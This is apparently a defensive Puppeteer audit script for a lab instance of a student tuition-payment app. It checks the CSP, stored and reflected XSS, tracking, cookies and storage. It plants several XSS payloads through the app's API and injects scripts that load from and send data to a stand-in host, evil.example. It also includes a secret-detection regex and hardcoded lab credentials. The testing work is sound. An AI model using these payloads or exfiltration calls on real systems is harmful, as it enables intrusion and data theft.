// Real-browser audit under the production CSP: tracking, third-party requests, CSP violations, stored XSS, storage, framing.
//   node scripts/security/browser_audit.mjs http://127.0.0.1:8090   (see README.md for the setup)
// It plants hostile text in the lab database, so only run it against the lab.
import { createRequire } from "node:module";
import path from "node:path";
import { fileURLToPath } from "node:url";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const require = createRequire(path.join(ROOT, "web", "package.json"));
const CHROME = process.env.CHROME_PATH ?? "C:/Program Files/Google/Chrome/Application/chrome.exe";
const puppeteer = require("puppeteer-core");
const APP = process.argv[2] ?? "http://127.0.0.1:8090";
const API = `${APP}/api/v1`;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const results = [];
const check = (name, ok, detail = "") => results.push({ name, ok: Boolean(ok), detail });

// ---- plant hostile data through the API before the browser looks at it
async function api(method, path, token, body, extra = {}) {
  const r = await fetch(`${API}${path}`, { method, headers: { "Content-Type": "application/json", ...(token ? { Authorization: `Bearer ${token}` } : {}), ...extra }, body: body ? JSON.stringify(body) : undefined });
  return { status: r.status, body: await r.json().catch(() => ({})) };
}
const login = async (email) => (await api("POST", "/auth/login", null, { email, password: "Sandbox#2026" })).body.access_token;
const parent = await login("parent@demo.studyroute.test");
const admin = await login("admin@demo.studyroute.test");
const PAYLOADS = ['<img src=x onerror="window.__xss=1">', '"><svg onload="window.__xss=2">', "<script>window.__xss=3</script>", "javascript:window.__xss=4", "{{constructor.constructor('window.__xss=5')()}}"];
let planted = 0;
for (const [i, p] of PAYLOADS.entries()) {
  const rec = await api("POST", "/recipients", parent, { type: "UNIVERSITY", display_name: `Evil ${p}`.slice(0, 120), country: "GB", bic: "EXMPGB2L", iban: "GB82WEST12345698765432" });
  const doc = await api("POST", "/documents", parent, { kind: "passport", filename: `evil-${i} ${p}`.slice(0, 190), content_text: p });
  const rule = await api("PUT", "/config/rules", admin, { key: "engine.planner_buffer_days", value: 2, reason: `Xss ${p}`.slice(0, 120) });
  planted += [rec, doc, rule].filter((r) => r.status < 300).length;
}
check("planted stored-XSS payloads in recipient names, document names and rule reasons", planted >= 5, `${planted} accepted`);

// The bank review desk shows text one side typed to the other side: a recipient name, the reviewer's note and
// the parent's reply. Plant markup in all three on a payment that waits for the reviewer.
const sign = async (email) => (await api("POST", "/auth/login", null, { email, password: "Sandbox#2026" })).body;
const mfa = async (token, scope, subject) => (await api("POST", "/auth/mfa/verify", token, { code: "246810", scope, subject_id: subject })).body.mfa_proof;
const idem = () => ({ "Idempotency-Key": crypto.randomUUID() });
const HOSTILE = '<img src=x onerror="window.__xss=9">';
await api("PUT", "/kyc/mock-review", admin, { user_id: (await sign("parent@demo.studyroute.test")).user.user_id, status: "VERIFIED" });
const reviewRecipient = (await api("POST", "/recipients", parent, { type: "UNIVERSITY", display_name: `REVIEW_TEST ${HOSTILE}`.slice(0, 120), country: "GB", bic: "EXMPGB2L", iban: "GB82WEST12345698765432" })).body.recipient_id;
await api("PATCH", `/recipients/${reviewRecipient}`, parent, { allowlisted: true }, { "X-MFA-Proof": await mfa(parent, "allowlist_recipient", reviewRecipient) });
const reviewQuote = (await api("POST", "/quotes", parent, { target: { amount_minor: 1_000_000, currency: "GBP" }, purpose: "TUITION", destination_country: "GB", charge_code: "OUR" })).body.quote_id;
const reviewPid = (await api("POST", "/payments", parent, { quote_id: reviewQuote, provider_id: "prov_b", recipient_id: reviewRecipient, reference: "INV-2026-4471 / STU-883201" }, idem())).body.payment_id;
const requested = await api("POST", `/payments/${reviewPid}/request-approval`, parent, {}, idem());
const asked = await api("POST", `/payments/${reviewPid}/bank-review/decision`, admin, { decision: "ASK_INFO", reason_code: "DOCUMENTS_MISSING", note: `Please send the fee note ${HOSTILE}` }, { ...idem(), "X-MFA-Proof": await mfa(admin, "review_payment", reviewPid) });
const replied = await api("POST", `/payments/${reviewPid}/bank-review/reply`, parent, { message: `Here is the fee note ${HOSTILE}` }, idem());
check("a payment with hostile text in its review is waiting at the bank desk (note and reply accepted or cleanly refused)", requested.status === 200 && [200, 422].includes(asked.status) && [200, 409, 422].includes(replied.status), `request ${requested.status}, ask ${asked.status}, reply ${replied.status}`);

const browser = await puppeteer.launch({ executablePath: CHROME, headless: true, args: ["--no-sandbox"] });
const page = await browser.newPage();
await page.setViewport({ width: 1366, height: 900 });
const origin = new URL(APP).origin;
const requests = [];
const consoleLines = [];
const referers = [];
page.on("request", (r) => { requests.push(r.url()); const ref = r.headers()["referer"]; if (ref) referers.push(`${r.url()} <- ${ref}`); });
page.on("console", (m) => consoleLines.push(`${m.type()}: ${m.text()}`));
page.on("pageerror", (e) => consoleLines.push(`pageerror: ${e.message}`));
let docHeaders = null;
page.on("response", (r) => { if (r.request().resourceType() === "document" && !docHeaders) docHeaders = r.headers(); });

// The selectors below match the Next.js UI (web/): main#main and nav[aria-label=Main].
const EMAIL = 'input[type="email"]', PASSWORD = 'input[type="password"]', SIGNED_IN = "main#main";
const navLink = (href) => `nav[aria-label="Main"] a[href="${href === "/" ? "/" : `${href}/`}"]`;
const signOut = () => page.evaluate(() => [...document.querySelectorAll("button")].find((b) => b.textContent.trim() === "Sign out")?.click());
const cdp = await page.createCDPSession();
async function signIn(email) {
  // A browser session is an HttpOnly cookie: start every sign-in from a clean jar, as a new person would.
  await cdp.send("Network.clearBrowserCookies");
  await page.evaluate(() => { try { sessionStorage.clear(); } catch {} }).catch(() => {});
  await page.goto(`${APP}/login`, { waitUntil: "networkidle0" });
  if (!(await page.$(EMAIL))) { await page.evaluate(() => sessionStorage.clear()); await page.goto(`${APP}/login`, { waitUntil: "networkidle0" }); }
  await page.type(EMAIL, email); await page.type(PASSWORD, "Sandbox#2026");
  await Promise.all([page.waitForSelector(SIGNED_IN), page.click('button[type="submit"]')]);
  await sleep(900);
}
const screens = ["/", "/compare", "/payments", "/recipients", "/documents", "/guide", "/audit", "/rules", "/bank", "/escrow", "/sandbox", "/bank-review"];
async function reviewPage(label) {
  await page.goto(`${APP}/payments/view/?id=${reviewPid}`, { waitUntil: "networkidle0" }); await sleep(1200);
  const text = await page.$eval("main", (el) => el.innerText).catch(() => "");
  check(`${label}: the bank review page ran no injected script`, (await page.evaluate(() => window.__xss)) === undefined, String(await page.evaluate(() => window.__xss)));
  check(`${label}: the review page shows the planted markup as literal text`, /<img src=x onerror/.test(text), text.slice(0, 80).replace(/\n/g, " "));
}
async function tour(label) {
  for (const href of screens) {
    const link = await page.$(navLink(href));
    if (!link) continue;
    await link.click(); await sleep(900);
    check(`${label}: ${href} ran no injected script`, (await page.evaluate(() => window.__xss)) === undefined, String(await page.evaluate(() => window.__xss)));
  }
}
await signIn("parent@demo.studyroute.test");
await tour("parent");
await reviewPage("parent");
const shown = await (async () => { await page.click(navLink("/recipients")); await sleep(900); return page.$eval("main", (el) => el.innerText); })();
check("the planted markup is shown as literal text, not interpreted", /<img src=x onerror/.test(shown), shown.slice(0, 80).replace(/\n/g, " "));
await signOut(); await sleep(600);
await signIn("admin@demo.studyroute.test");
await tour("admin");
await reviewPage("admin");

// reflected: a hostile path and query string
for (const hostile of ["/payments/%3Cimg%20src=x%20onerror=window.__xss=6%3E", "/?q=%3Cscript%3Ewindow.__xss=7%3C/script%3E", "/escrow#%3Csvg%20onload=window.__xss=8%3E"]) {
  await page.goto(`${APP}${hostile}`, { waitUntil: "networkidle0" }); await sleep(700);
  check(`hostile URL ${hostile.slice(0, 32)}... ran nothing`, (await page.evaluate(() => window.__xss)) === undefined, "");
}

// ---- the page itself
check("the document carries the production CSP", /default-src 'self'/.test(docHeaders?.["content-security-policy"] ?? ""), docHeaders?.["content-security-policy"] ?? "none");
check("the CSP forbids inline scripts, remote scripts, frames and plugins", /script-src 'self'/.test(docHeaders["content-security-policy"]) && !/unsafe-inline|unsafe-eval|\*/.test(docHeaders["content-security-policy"]) && /frame-ancestors 'none'/.test(docHeaders["content-security-policy"]) && /object-src 'none'/.test(docHeaders["content-security-policy"]), "");
await page.goto(`${APP}/login`, { waitUntil: "networkidle0" });
const injected = await page.evaluate(() => { const s = document.createElement("script"); s.textContent = "window.__csp = 1"; document.head.appendChild(s); return window.__csp; });
check("CSP blocks an inline script injected into the page", injected === undefined, String(injected));
const inlineStyle = await page.evaluate(() => { document.body.setAttribute("style", "background: rgb(255, 0, 0)"); return getComputedStyle(document.body).backgroundColor; });
check("CSP blocks an injected inline style attribute", inlineStyle !== "rgb(255, 0, 0)", inlineStyle);
const remote = await page.evaluate(() => new Promise((resolve) => { const s = document.createElement("script"); s.src = "https://evil.example/x.js"; s.onload = () => resolve("loaded"); s.onerror = () => resolve("blocked"); document.head.appendChild(s); setTimeout(() => resolve("blocked(timeout)"), 3000); }));
check("CSP blocks a script from another origin", remote.startsWith("blocked"), remote);
const beacon = await page.evaluate(() => fetch("https://evil.example/steal", { mode: "no-cors" }).then(() => "sent").catch(() => "blocked"));
check("CSP blocks the page from sending data to another origin (connect-src)", beacon === "blocked", beacon);
const framed = await page.evaluate((url) => new Promise((resolve) => { const f = document.createElement("iframe"); f.src = url; f.onload = () => { try { resolve(f.contentDocument ? "framed" : "blocked"); } catch { resolve("blocked"); } }; document.body.appendChild(f); setTimeout(() => resolve("blocked(timeout)"), 3000); }), `${APP}/login`);
check("the app refuses to be framed (clickjacking)", framed.startsWith("blocked") || framed === "framed" && false, framed);
const violations = consoleLines.filter((l) => /Content Security Policy|Refused to/i.test(l));
const ownViolations = violations.filter((l) => !/evil\.example|inline|style|Framing /i.test(l)); // the rest are my own attack attempts being blocked
check("no CSP violation came from the app's own pages (only from my attack attempts)", ownViolations.length === 0, ownViolations.slice(0, 3).join(" | "));

// ---- tracking
const foreign = [...new Set(requests.filter((u) => !u.startsWith(origin) && !u.startsWith("data:") && !u.startsWith("blob:") && !u.includes("evil.example")))];
check("every request the app made went to its own origin (no third parties, no analytics, no CDN, no fonts)", foreign.length === 0, foreign.slice(0, 5).join(", "));
check(`the app made ${requests.length} requests, none to a tracker`, true);
check("no request carried a Referer header (Referrer-Policy: no-referrer)", referers.length === 0, referers.slice(0, 2).join(" | "));
const cookies = await page.cookies();
const sessionCookies = cookies.filter((c) => c.name === "sr_browser_session");
check("the only cookie is the one HttpOnly, SameSite=Strict session cookie (nothing to track a browser with)", cookies.length === sessionCookies.length && cookies.length <= 1 && sessionCookies.every((c) => c.httpOnly && c.sameSite === "Strict"), JSON.stringify(cookies.map((c) => ({ name: c.name, httpOnly: c.httpOnly, sameSite: c.sameSite }))));
check("script cannot read the session cookie (document.cookie is empty)", (await page.evaluate(() => document.cookie)) === "", "");
await signIn("parent@demo.studyroute.test");
const storage = await page.evaluate(() => ({ local: { ...localStorage }, session: { ...sessionStorage } }));
check("localStorage holds nothing sensitive (only a theme choice and rate-alert targets)", Object.keys(storage.local).every((k) => /^sr\.(theme|rate-alert)/.test(k)), JSON.stringify(Object.keys(storage.local)));
check("sessionStorage holds no token, password or e-mail (the refresh token is no longer in JavaScript storage)", !Object.keys(storage.session).some((k) => /refresh|token|auth/i.test(k)) && !/Sandbox#2026|@|eyJ/.test(JSON.stringify(storage.session)), JSON.stringify(Object.keys(storage.session)));
const fp = await page.evaluate(() => ({ canvas: typeof HTMLCanvasElement.prototype.toDataURL, ga: typeof window.ga, gtag: typeof window.gtag, dl: typeof window.dataLayer, fbq: typeof window.fbq }));
check("no analytics globals (ga, gtag, dataLayer, fbq) exist", fp.ga === "undefined" && fp.gtag === "undefined" && fp.dl === "undefined" && fp.fbq === "undefined", JSON.stringify(fp));
await signOut(); await sleep(800);
const after = await page.evaluate(() => ({ s: Object.keys(sessionStorage), l: Object.keys(localStorage) }));
const cookiesAfter = (await page.cookies()).filter((c) => c.name === "sr_browser_session");
check("signing out removes the session cookie and leaves nothing in sessionStorage", cookiesAfter.length === 0 && after.s.length === 0, JSON.stringify({ cookies: cookiesAfter.length, ...after }));
// no source maps or secrets in what the browser can download
const assets = [...new Set(requests.filter((u) => /[/](assets|_next[/]static)[/]/.test(u)))];
let maps = 0, secretish = 0;
for (const url of assets.filter((u) => u.endsWith(".js") || u.endsWith(".css"))) {
  const text = await (await fetch(url)).text();
  if (/sourceMappingURL/.test(text)) maps++;
  if (/BEGIN (EC |RSA )?PRIVATE KEY|sk-[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16}|Sandbox#2026|api[_-]?key["']?\s*[:=]\s*["'][A-Za-z0-9]{16,}/.test(text)) secretish++;
}
check(`none of ${assets.length} downloaded assets reference a source map`, maps === 0, String(maps));
check("none of the downloaded JavaScript or CSS contains a key, token or password", secretish === 0, String(secretish));

await browser.close();
for (const r of results) console.log(`${r.ok ? "PASS" : "FAIL"}  ${r.name}${r.ok ? "" : "  -> " + r.detail}`);
console.log(`${results.filter((r) => r.ok).length}/${results.length} checks passed`);
